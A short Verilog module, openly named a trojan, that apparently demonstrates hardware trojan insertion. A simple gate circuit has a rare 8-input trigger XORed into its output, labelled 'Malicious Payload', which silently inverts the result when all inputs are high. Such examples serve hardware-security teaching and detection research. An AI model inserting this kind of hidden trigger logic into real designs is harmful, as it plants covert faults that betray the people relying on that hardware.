`timescale 1ns / 1ps

module trojan(
    input a,
    input b,
    input c,
    input d,
    input e,
    input f,
    input g,
    input h,
    output y
);

wire n1;
wire n2;
wire normal_y;
wire trigger;

and U1(n1, a, b);
or  U2(n2, n1, c);
not U3(normal_y, n2);

// Rare trigger (8-input AND)
and T1(trigger, a, b, c, d, e, f, g, h);

// Malicious Payload (XOR Inverter)
xor T2(y, normal_y, trigger);

endmodule